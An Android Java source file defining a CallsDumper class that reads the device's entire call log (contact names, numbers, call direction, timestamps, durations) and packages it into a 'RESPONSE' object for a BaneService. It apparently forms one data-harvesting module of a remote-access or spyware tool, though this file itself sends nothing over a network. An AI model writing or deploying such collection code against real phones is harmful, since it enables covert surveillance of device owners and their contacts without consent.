package com.example.bane.bane.dumper;

import android.annotation.SuppressLint;
import android.database.Cursor;
import android.provider.CallLog;

import com.bane.model.BaneCode;
import com.bane.model.BaneObject;
import com.bane.model.BaneValue;
import com.example.bane.BaneService;

import java.text.SimpleDateFormat;
import java.util.Date;

public class CallsDumper extends Dumper {
    @Override
    public BaneObject dump() {
        StringBuffer sb = new StringBuffer();
        String[] projection = new String[] {
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
        };
        sb.append("Call Details :");
        Cursor managedCursor = BaneService.context.getContentResolver().query(CallLog.Calls.CONTENT_URI, projection, null, null, null);
        while (managedCursor.moveToNext()) {
            String name = managedCursor.getString(0); //name
            String number = managedCursor.getString(1); // number
            String type = managedCursor.getString(2); // type
            String date = managedCursor.getString(3); // time
            @SuppressLint("SimpleDateFormat")
            SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy HH:mm");
            String dateString = formatter.format(new Date(Long.parseLong(date)));

            String duration = managedCursor.getString(4); // duration

            String dir = null;
            int dircode = Integer.parseInt(type);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("\nPhone Name :-- " + name + "  Number:--- " + number + " \nCall Type:--- " + dir + " \nCall Date:--- " + dateString + " \nCall duration in sec :--- " + duration);
            sb.append("\n----------------------------------");
        }
        return new BaneObject(BaneCode.RESPONSE,"",new BaneValue[]{new BaneValue<String>("calls",sb.toString())});
    }
}
